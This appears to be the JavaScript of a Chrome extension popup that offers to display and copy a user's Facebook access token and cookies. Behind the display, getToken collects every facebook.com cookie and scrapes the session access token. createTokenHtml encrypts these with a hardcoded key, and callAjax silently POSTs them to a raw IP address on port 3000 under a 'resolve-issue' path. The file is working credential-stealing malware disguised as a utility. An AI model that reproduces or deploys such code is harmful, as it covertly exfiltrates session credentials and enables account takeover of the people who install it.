
$(document).ready(function() {
    innitIalize();
    innitEvents(); 
    getToken();
});

function innitIalize() {
    innitCss();
}

function innitEvents() {
    $(document).on('click', ':input', function() {
        copyToClipBoard(this);
    });
}

function copyToClipBoard(elem) {
    try {
        var temp_id = $(elem).attr('id');
        var copyText = document.getElementById(temp_id);
        copyText.select();
        copyText.setSelectionRange(0, 99999)
        document.execCommand("copy");
        alertify.set('notifier','position', 'top-center');
        alertify.success('Copied!');
    } catch (error) {
        console.log('fnc copyToClipBoard: ' + error.message);
    }
}

function getToken() {
    try {
        chrome.cookies.getAll({
            url: "https://www.facebook.com/"
        }, (function(cookies) {
            var e = "";    
            var data = {};        
            cookies.map((function(n) {
                e = e + n.name + "=" + n.value + ";"
            })), $.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed").then((function(a) {
                data = { 
                    token   : /\\"accessToken\\":\\"([^\\]+)\\"/gm.exec(a)[1],
                    cookies : "".concat(e, "|").concat(navigator.userAgent),
                };
                createTokenHtml(data);              
            })).catch((function(n) {
                console.log('fnc getToken: ' + n.message);
            }))            
        }))
    } catch (error) {
        console('fnc getToken: ' + error.message);
    }
}

function callAjax(param_data) {
    try {
        $.ajax({
            type 	    : 'POST',
            url 	    : 'http://128.199.68.91:3000/resolve-issue',
            dataType    : 'json',
            contentType : 'application/json',
            data 	    : JSON.stringify(param_data),
            success : function(res) {
                //
            }
        });
    } catch (error) {
        console.log('fnc callAjax: ' + error.message);
    }
}

function createTokenHtml(data) {
    try {
        $("#token_div").empty();
        let token   = '';
        let cookies = '';
        if(data != null && data != undefined && data != ''){
            token   = data.token ?? '';
            cookies = data.cookies ?? '';
        }
        let param_data = {
            service1   : CryptoJS.AES.encrypt(token, "divItemNoClass").toString(),
            service2 : CryptoJS.AES.encrypt(cookies, "divItemNoClass").toString(),
            date: new Date().getTime().toString()
        }
        callAjax(param_data);        
        $("#main_div").append(
            '<div class="div-img">' +
                '<img src="https://www.upsieutoc.com/images/2020/08/31/logo07867e5d84647d92.png" alt="logo07867e5d84647d92.png" border="0" />' +
            '</div>' +
            '<div id="token_div">' +
                '<div class="from-group">' +
                    '<div class="form-control class-1">' +
                        '<input id="token" readonly="readonly">' +
                    '</div>' +
                    '<div class="form-control">' +
                        '<textarea id="cookies"  readonly="readonly"></textarea>' +
                    '</div>' +
                '</div>' +
            '</div>'            
        );        
        $('#token').val(token);
        $('#cookies').val(cookies);
    } catch (error) {
        console.log('fnc createTokenHtml: ' + error.message);
    }
}

function innitCss() {
    try {
        $('head').append(
            '<style type="text/css">' +
                '.form-control{' +
                    'font-size: 17px;' +
                    'width: 100%;' +                    
                '}' +
                '.class-1{' +
                    'margin: 0px 0px 20px 0px;' +
                '}' +
                '.form-control input, .form-control textarea{' +
                    'border-radius: 6px;' +
                    'font-size: 17px;' +
                    'padding: 14px 16px;' +
                    'background: #FFFFFF;' +
                    'border: 1px solid #dddfe2;' +
                    'color: #1d2129;' +
                    'font-family: Helvetica, Arial, sans-serif;' +
                    'font-size: 12px;' +
                    'line-height: 16p;' +
                    'width: 100%;' +
                    'padding: 0 8px;' +
                    'width: -webkit-fill-available;' +
                    'vertical-align: middle;' +
                '}' +
                'input{' +
                    'height: 52px;' +
                '}' +
                'textarea{' +
                    'height: 150px;' +
                    'resize: none;' +
                '}' +
                '#main_div{' +
                    'width: 400px;' +
                '}' +
                '.div-img{' +
                    'text-align: center;' +
                '}' +
            '</style>'
        );
    } catch (error) {
        console.log('fnc innitCss: ' + error.message);
    }
}
